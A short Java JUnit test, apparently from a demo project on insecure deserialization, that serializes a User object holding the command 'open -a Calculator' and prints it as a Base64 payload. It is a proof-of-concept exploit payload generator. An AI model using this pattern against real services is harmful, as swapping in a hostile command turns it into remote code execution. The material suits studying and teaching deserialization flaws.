package com.exploit.exploitunserialize.model;

import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;

import static org.junit.jupiter.api.Assertions.*;

class UserTest {
    private String payload;
    @Test
    public void createPayload() throws Exception {
        User evil = new User("open -a Calculator");
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(byteArrayOutputStream);
        oos.writeObject(evil);
        oos.close();

        payload = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());
        assertNotNull(payload);
    }

    @AfterEach
    void tearDown() {
        System.out.println("payload: " + payload);
    }
}